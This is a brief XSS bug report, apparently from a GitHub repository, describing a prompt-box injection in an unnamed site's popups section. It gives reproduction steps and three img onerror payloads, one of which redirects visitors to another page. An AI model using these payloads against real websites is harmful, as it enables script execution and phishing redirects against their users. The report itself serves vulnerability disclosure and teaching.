# Cross Site Scripting (XSS) 

## What is a Cross site scripting (XSS) Attack?
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.  
![image]([https://user-images.githubusercontent.com/72333625/194703655-3aa37fff-031f-4ab5-9097-8ce944130752.png](https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.imperva.com%2Flearn%2Fapplication-security%2Fcross-site-scripting-xss-attacks%2F&psig=AOvVaw1U0zM-jmfypl9AU9uvXdN-&ust=1665407563688000&source=images&cd=vfe&ved=0CAwQjRxqFwoTCKCdquac0_oCFQAAAAAdAAAAABAD))

### BUG: 

Redirection to  different site 

# Steps to reproduce the mentioned bug:
1) First login into site
        
2) then go to more section and popups folder
        
3) there you will see prompt box
       
4) you can put xss payload in the prompt box(some certain payload work not all of them 
    like prompt() , print()
    
## Payloads Used 
1) <img/src/onerror=prompt(8)> 

2)<img src/onerror=prompt(8)>

4)<img src=q onerror=location.href = "https://www.example.com";>

# Impact 

Attacker can use this vulnerability to redirect it to desired page itself.  
